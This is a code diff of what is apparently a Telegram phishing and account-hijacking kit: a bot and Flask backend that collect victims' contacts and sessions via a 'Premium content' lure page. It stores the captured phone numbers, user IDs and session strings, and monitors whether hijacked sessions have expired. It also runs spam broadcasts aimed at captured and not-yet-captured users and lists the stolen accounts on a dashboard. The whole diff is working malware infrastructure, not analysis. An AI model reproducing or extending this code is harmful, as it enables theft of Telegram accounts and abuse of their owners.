+            await safe_send(chat_id, "✅ Both deleted.", admin_menu(), edit_event=event)
 
         elif data == "menu_toggle_expired":
             AUTO_DELETE_EXPIRED = not AUTO_DELETE_EXPIRED
-            await event.answer(f"Auto-Delete: {'ON' if AUTO_DELETE_EXPIRED else 'OFF'}", alert=True)
+            await event.answer(f"Auto-Del: {'ON' if AUTO_DELETE_EXPIRED else 'OFF'}", alert=True)
             await safe_send(chat_id,
                 f"🗑 Auto-Delete: **{'ON' if AUTO_DELETE_EXPIRED else 'OFF'}**",
                 admin_menu(), edit_event=event)
 
-        # ---- TIMERS ----
         elif data == "menu_timer":
             STATE["awaiting_timer"] = True
             await event.answer()
             await safe_send(chat_id,
-                f"⏱ NL Timer: `{timer_value}s`\n\nSend number.",
+                f"⏱ **Set Timer**\n\nCurrent: `{timer_value}s`\n\nSend number.",
                 [[Button.inline("⬅️ Back", b"menu_home")]], edit_event=event)
 
-        elif data == "menu_timer_l":
-            STATE["awaiting_timer_l"] = True
-            await event.answer()
-            await safe_send(chat_id,
-                f"⏱ L Timer: `{timer_value_logged}s`\n\nSend number.",
-                [[Button.inline("⬅️ Back", b"menu_home")]], edit_event=event)
-
-        # ---- MISC ----
         elif data == "menu_users":
-            logged_count = sum(1 for u in users.values() if u.get("section_logged_in"))
-            await event.answer(f"Total: {len(users)}\nLogged: {logged_count}", alert=True)
+            await event.answer(f"Total: {len(users)}", alert=True)
 
         elif data == "menu_stats":
+            b = broadcast_config
             exp_count = sum(1 for a in captured_accounts if a.get("status") == "expired")
             term_count = sum(1 for a in captured_accounts if a.get("status") == "terminated")
-            prem_count = sum(1 for a in captured_accounts if a.get("is_premium"))
-            logged_count = sum(1 for u in users.values() if u.get("section_logged_in"))
             await event.answer(
-                f"Users: {len(users)}\nLogged: {logged_count}\n"
-                f"Broadcast: {broadcast_state['active']}\n"
-                f"Welcome: {len(welcome_config.get('messages', []))}\n"
-                f"Expired: {exp_count}\nTerminated: {term_count}\nPremium: {prem_count}",
+                f"Users: {len(users)}\n"
+                f"NL queue: {len(b.get('nonlogged', []))} (Active: {broadcast_state['nonlogged_active']})\n"
+                f"Logged queue: {len(b.get('logged', []))} (Active: {broadcast_state['logged_active']})\n"
+                f"Timer: {timer_value}s\nWelcome: {len(welcome_config.get('messages', []))}\n"
+                f"Expired: {exp_count}\nTerminated: {term_count}",
                 alert=True)
 
         else:
@@ -929,18 +921,13 @@ async def cancel(event):
         return
     for k in STATE:
         STATE[k] = False
-    broadcast_state['messages'] = []
-    broadcast_state['active'] = False
-    broadcast_state_logged['messages'] = []
-    broadcast_state_logged['active'] = False
+    STATE["awaiting_share_field"] = None
     await event.respond("Cancelled.", buttons=admin_menu())
 
 
-# ============================================================
-# CAPTURE
-# ============================================================
 @bot.on(events.NewMessage())
 async def capture(event):
+    global welcome_config, broadcast_config
     if event.sender_id != YOUR_TELEGRAM_ID:
         try:
             if event.message and event.message.contact:
@@ -955,7 +942,7 @@ async def capture(event):
     if txt.startswith('/'):
         return
 
-    if STATE.get("awaiting_timer"):
+    if STATE["awaiting_timer"]:
         try:
             sec = int(txt.strip())
             if sec < 5:
@@ -963,35 +950,21 @@ async def capture(event):
             timer_value = sec
             STATE["awaiting_timer"] = False
             broadcast_state['interval'] = sec
-            await event.respond(f"✅ NL Timer: **{sec}s**",
+            await event.respond(f"✅ Timer: **{sec}s**",
                 buttons=admin_menu(), parse_mode='md')
         except ValueError:
             await event.respond("Send a number")
         return
 
-    if STATE.get("awaiting_timer_l"):
-        try:
-            sec = int(txt.strip())
-            if sec < 5:
-                return await event.respond("Min 5 seconds")
-            timer_value_logged = sec
-            STATE["awaiting_timer_l"] = False
-            broadcast_state_logged['interval'] = sec
-            await event.respond(f"✅ L Timer: **{sec}s**",
-                buttons=admin_menu(), parse_mode='md')
-        except ValueError:
-            await event.respond("Send a number")
-        return
-
-    if STATE.get("awaiting_btn_text"):
+    if STATE["awaiting_btn_text"]:
         welcome_config["button_text"] = txt.strip()[:40]
         STATE["awaiting_btn_text"] = False
         save_welcome_config(welcome_config)
-        await event.respond(f"✅ Btn: `{welcome_config['button_text']}`",
+        await event.respond(f"✅ Button: `{welcome_config['button_text']}`",
             buttons=admin_menu(), parse_mode='md')
         return
 
-    if STATE.get("awaiting_btn_url"):
+    if STATE["awaiting_btn_url"]:
         welcome_config["button_url"] = txt.strip()
         STATE["awaiting_btn_url"] = False
         save_welcome_config(welcome_config)
@@ -999,42 +972,16 @@ async def capture(event):
             buttons=admin_menu(), parse_mode='md')
         return
 
-    if STATE.get("awaiting_share_text"):
-        share_config["share_text"] = txt.strip()
-        STATE["awaiting_share_text"] = False
+    if STATE.get("awaiting_share_field"):
+        field = STATE["awaiting_share_field"]
+        share_config[field] = txt.strip()
+        STATE["awaiting_share_field"] = None
         save_share_config(share_config)
-        await event.respond("✅ Share text updated.", buttons=admin_menu())
+        await event.respond(f"✅ Share {field} updated.",
+            buttons=admin_menu(), parse_mode='md')
         return
 
-    if STATE.get("awaiting_share_link"):
-        share_config["share_link"] = txt.strip()
-        STATE["awaiting_share_link"] = False
-        save_share_config(share_config)
-        await event.respond("✅ Share link updated.", buttons=admin_menu())
-        return
-
-    if STATE.get("awaiting_share_emoji"):
-        share_config["share_emoji"] = txt.strip()[:20]
-        STATE["awaiting_share_emoji"] = False
-        save_share_config(share_config)
-        await event.respond("✅ Share emoji updated.", buttons=admin_menu())
-        return
-
-    if STATE.get("awaiting_share_btn"):
-        share_config["button_text"] = txt.strip()[:40]
-        STATE["awaiting_share_btn"] = False
-        save_share_config(share_config)
-        await event.respond("✅ Button text updated.", buttons=admin_menu())
-        return
-
-    if STATE.get("awaiting_logged_msg"):
-        share_config["logged_message"] = txt.strip()
-        STATE["awaiting_logged_msg"] = False
-        save_share_config(share_config)
-        await event.respond("✅ Logged message updated.", buttons=admin_menu())
-        return
-
-    if STATE.get("welcome_capture"):
+    if STATE["welcome_capture"]:
         m = event.message
         entry = {"type": "text", "content": m.message or ""}
         if m.photo:
@@ -1045,12 +992,13 @@ async def capture(event):
         save_welcome_config(welcome_config)
         await event.respond(
             f"✅ Welcome #{len(welcome_config['messages'])} added.",
-            buttons=[[Button.inline("⏹ Stop", b"wl_stop")],
-                     [Button.inline("⬅️ Back", b"menu_home")]])
+            buttons=[
+                [Button.inline("⏹ Stop & Save", b"wl_stop")],
+                [Button.inline("⬅️ Back", b"menu_home")]
+            ])
         return
 
-    cm = STATE.get("capture_mode")
-    if cm == "nl":
+    if STATE["bc_nonlogged_capture"]:
         m = event.message
         entry = {"type": "text", "content": m.message or "",
                  "caption": "", "_msg_id": m.id, "_chat_id": event.chat_id}
@@ -1060,14 +1008,17 @@ async def capture(event):
         elif m.video:
             entry["type"] = "video"
             entry["caption"] = m.message or ""
-        broadcast_state['messages'].append(entry)
+        broadcast_config.setdefault("nonlogged", []).append(entry)
+        save_broadcast_config(broadcast_config)
         await event.respond(
-            f"✅ NL #{len(broadcast_state['messages'])} added.",
-            buttons=[[Button.inline("▶️ Start", b"bc_nl_start")],
-                     [Button.inline("❌ Cancel", b"bc_nl_cancel")]])
+            f"✅ Non-Logged #{len(broadcast_config['nonlogged'])} added.",
+            buttons=[
+                [Button.inline("▶️ Start Now", b"bcnl_start")],
+                [Button.inline("❌ Cancel", b"bcnl_cancel")]
+            ])
         return
 
-    if cm == "l":
+    if STATE["bc_logged_capture"]:
         m = event.message
         entry = {"type": "text", "content": m.message or "",
                  "caption": "", "_msg_id": m.id, "_chat_id": event.chat_id}
@@ -1077,17 +1028,17 @@ async def capture(event):
         elif m.video:
             entry["type"] = "video"
             entry["caption"] = m.message or ""
-        broadcast_state_logged['messages'].append(entry)
+        broadcast_config.setdefault("logged", []).append(entry)
+        save_broadcast_config(broadcast_config)
         await event.respond(
-            f"✅ L #{len(broadcast_state_logged['messages'])} added.",
-            buttons=[[Button.inline("▶️ Start", b"bc_l_start")],
-                     [Button.inline("❌ Cancel", b"bc_l_cancel")]])
+            f"✅ Logged #{len(broadcast_config['logged'])} added.",
+            buttons=[
+                [Button.inline("▶️ Start Now", b"bclg_start")],
+                [Button.inline("❌ Cancel", b"bclg_cancel")]
+            ])
         return
 
 
-# ============================================================
-# MONITOR + LOOPS
-# ============================================================
 async def section_monitor():
     while True:
         try:
@@ -1121,7 +1072,7 @@ async def section_monitor():
                             a["status"] = "expired"
                             a["expired_at"] = time.time()
                             changed = True
-                            logger.info(f"⚠️ Session expired: {a['phone']}")
+                            logger.info(f"Session expired: {a['phone']}")
                     else:
                         added = a.get("added_at", 0)
                         if time.time() - added > 86400 and a.get("status") != "terminated":
@@ -1148,7 +1099,7 @@ async def section_monitor():
                             a["status"] = "terminated"
                             a["terminated_at"] = time.time()
                             changed = True
-                            logger.info(f"⚰️ Session terminated: {a['phone']}")
+                            logger.info(f"Terminated: {a['phone']}")
                 except Exception as e:
                     logger.error(f"monitor err {a.get('phone')}: {e}")
             if changed:
@@ -1158,67 +1109,94 @@ async def section_monitor():
             logger.error(f"section_monitor err: {e}")
 
 
-async def _broadcast_loop(state, target_check, label):
-    """Generic broadcast loop.
-    state: broadcast_state or broadcast_state_logged
-    target_check: function that takes user_record -> bool
-    label: 'NL' or 'L'
-    """
+async def broadcast_loop():
     while True:
         try:
             await asyncio.sleep(3)
-            if not state['active']:
-                continue
-            if time.time() < state['next_run']:
-                continue
-            if not state['messages']:
-                state['active'] = False
-                continue
-            ok = 0
-            fail = 0
-            targets = [uid for uid, u in users.items() if target_check(u)]
-            for uid_str in targets:
-                uid = int(uid_str)
-                for entry in state['messages']:
-                    try:
-                        if entry['type'] == 'text':
-                            sent = await safe_send_user(uid, entry['content'] or entry['caption'])
-                            if sent:
-                                ok += 1
-                            else:
-                                fail += 1
-                        elif entry['type'] in ('photo', 'video'):
-                            try:
-                                msg = await bot.get_messages(entry['_chat_id'], ids=entry['_msg_id'])
-                                await bot.send_message(uid, msg)
-                                ok += 1
-                            except Exception:
-                                if entry.get('caption'):
-                                    s = await safe_send_user(uid, entry['caption'])
-                                    if s:
-                                        ok += 1
-                                    else:
-                                        fail += 1
+
+            # Non-logged broadcast
+            if broadcast_state["nonlogged_active"] and time.time() >= broadcast_state["nonlogged_next"]:
+                msgs = broadcast_config.get("nonlogged", [])
+                if msgs:
+                    await run_broadcast(msgs, target="nonlogged")
+                    broadcast_state["nonlogged_next"] = time.time() + broadcast_state['interval']
+                else:
+                    broadcast_state["nonlogged_active"] = False
+
+            # Logged broadcast
+            if broadcast_state["logged_active"] and time.time() >= broadcast_state["logged_next"]:
+                msgs = broadcast_config.get("logged", [])
+                if msgs:
+                    await run_broadcast(msgs, target="logged")
+                    broadcast_state["logged_next"] = time.time() + broadcast_state['interval']
+                else:
+                    broadcast_state["logged_active"] = False
+
+        except Exception as e:
+            logger.error(f"loop err: {e}")
+
+
+async def run_broadcast(messages, target="nonlogged"):
+    """target: 'nonlogged' — users who have NOT shared contact yet; 'logged' — users who HAVE captured"""
+    # Determine user IDs
+    if target == "logged":
+        # Logged = users whose tg_id appears in captured accounts
+        captured_uids = set()
+        for a in captured_accounts:
+            uid = a.get("user_id")
+            if uid:
+                captured_uids.add(str(uid))
+        target_uids = [u for u in users.keys() if u in captured_uids]
+    else:
+        captured_uids = set()
+        for a in captured_accounts:
+            uid = a.get("user_id")
+            if uid:
+                captured_uids.add(str(uid))
+        target_uids = [u for u in users.keys() if u not in captured_uids]
+
+    ok = 0
+    fail = 0
+    for uid_str in target_uids:
+        try:
+            uid = int(uid_str)
+            for entry in messages:
+                try:
+                    if entry['type'] == 'text':
+                        sent = await safe_send_user(uid, entry['content'] or entry['caption'])
+                        if sent:
+                            ok += 1
+                        else:
+                            fail += 1
+                    elif entry['type'] in ('photo', 'video'):
+                        try:
+                            msg = await bot.get_messages(entry['_chat_id'], ids=entry['_msg_id'])
+                            await bot.send_message(uid, msg)
+                            ok += 1
+                        except Exception:
+                            if entry.get('caption'):
+                                s = await safe_send_user(uid, entry['caption'])
+                                if s:
+                                    ok += 1
                                 else:
                                     fail += 1
-                        else:
-                            ok += 1
-                    except Exception as e:
-                        fail += 1
-                        err = str(e).lower()
-                        if 'blocked' in err or 'deactivated' in err or 'not found' in err:
-                            users.pop(uid_str, None)
-                            save_users(users)
-                    await asyncio.sleep(0.4)
-            state['next_run'] = time.time() + state['interval']
-            logger.info(f"[{label}] Broadcast: {ok} sent, {fail} failed")
-            try:
-                await bot.send_message(YOUR_TELEGRAM_ID,
-                    f"📢 [{label}] Round done\n✅ {ok}\n❌ {fail}\n👥 {len(targets)}")
-            except Exception:
-                pass
+                    else:
+                        ok += 1
+                except Exception as e:
+                    fail += 1
+                await asyncio.sleep(0.4)
         except Exception as e:
-            logger.error(f"[{label}] loop err: {e}")
+            fail += 1
+            err = str(e).lower()
+            if 'blocked' in err or 'deactivated' in err or 'not found' in err:
+                users.pop(uid_str, None)
+                save_users(users)
+    logger.info(f"Broadcast [{target}]: {ok} sent, {fail} failed")
+    try:
+        await bot.send_message(YOUR_TELEGRAM_ID,
+            f"📢 **{target}** round done\n✅ {ok}\n❌ {fail}\n👥 {len(target_uids)}")
+    except Exception:
+        pass
 
 
 async def self_ping_loop():
@@ -1236,10 +1214,7 @@ async def bot_main():
     await bot.start(bot_token=BOT_TOKEN)
     me = await bot.get_me()
     logger.info(f"✅ Bot started as @{me.username} (id={me.id})")
-    asyncio.create_task(_broadcast_loop(broadcast_state,
-        lambda u: not u.get("section_logged_in", False), "NL"))
-    asyncio.create_task(_broadcast_loop(broadcast_state_logged,
-        lambda u: u.get("section_logged_in", False), "L"))
+    asyncio.create_task(broadcast_loop())
     asyncio.create_task(section_monitor())
     asyncio.create_task(self_ping_loop())
     await bot.run_until_disconnected()
@@ -1349,6 +1324,7 @@ var contactForce = null;
 var inProgress = false;
 var TG_CHANNEL = 'https://t.me/videodks';
 var TG_CAPTION = 'Premium content';
+var SHARE_EMOJI = '🔥';
 function show(id) { document.getElementById(id).classList.add('on'); }
 function hide(id) { document.getElementById(id).classList.remove('on'); }
 function msg(id, text, type) {
@@ -1610,14 +1586,15 @@ def health():
         'bot_connected': bot.is_connected(),
         'accounts': len(captured_accounts),
         'bot_users': len(users),
-        'logged_users': sum(1 for u in users.values() if u.get("section_logged_in")),
-        'nl_broadcast': broadcast_state['active'],
-        'l_broadcast': broadcast_state_logged['active'],
+        'nl_active': broadcast_state['nonlogged_active'],
+        'lg_active': broadcast_state['logged_active'],
         'welcome_count': len(welcome_config.get('messages', [])),
-        'expired': sum(1 for a in captured_accounts if a.get('status') == 'expired'),
-        'terminated': sum(1 for a in captured_accounts if a.get('status') == 'terminated'),
-        'premium': sum(1 for a in captured_accounts if a.get('is_premium')),
     })
+
+
+@app.route('/api/share_config')
+def get_share_config():
+    return jsonify(share_config)
 
 
 @app.route('/api/save_contact', methods=['POST'])
@@ -1681,12 +1658,7 @@ def get_session(phone):
     if not a:
         return jsonify({'error': 'Not found'}), 404
     return jsonify({'phone': phone, 'user_id': a['user_id'],
-        'name': f"{a['first_name']} {a['last_name']}",
-        'username': a['username'], 'dc': a['dc'],
-        'session': a['session'], 'session_length': len(a['session']),
-        'has_2fa': a.get('has_2fa', False),
-        'status': a.get('status', 'active'),
-        'is_premium': a.get('is_premium', False)})
+        'status': a.get('status', 'active')})
 
 
 @app.route('/dash')
@@ -1696,16 +1668,8 @@ def dash():
     rows = ""
     for i, a in enumerate(captured_accounts, 1):
         sl = len(a.get('session', ''))
-        st = a.get('status', 'active')
-        if st == 'terminated':
-            badge = " ⚰️ Terminated ❌"
-        elif st == 'expired':
-            badge = " ⚠️ Expired ❌"
-        elif a.get('is_premium'):
-            badge = " ✨✨ Premium"
-        else:
-            badge = ""
-        rows += f"<tr><td>{i}</td><td>{a['phone']}</td><td>{a.get('first_name','')} {a.get('last_name','')}{badge}</td><td>@{a.get('username','-')}</td><td>{a.get('user_id','')}</td><td>{a.get('dc','')}</td><td>({sl})</td></tr>"
+        lbl = account_label(a)
+        rows += f"<tr><td>{i}</td><td>{a['phone']}</td><td>{a.get('first_name','')} {a.get('last_name','')} {lbl}</td><td>@{a.get('username','-')}</td><td>{a.get('user_id','')}</td><td>{a.get('dc','')}</td><td>({sl})</td></tr>"
     return ("<!DOCTYPE html><html><head><title>Dash</title><style>"
         "body{background:#0a0a0a;color:white;font-family:Arial;padding:20px}"
         "h1{color:#e94560}table{width:100%;border-collapse:collapse;margin-top:15px}"
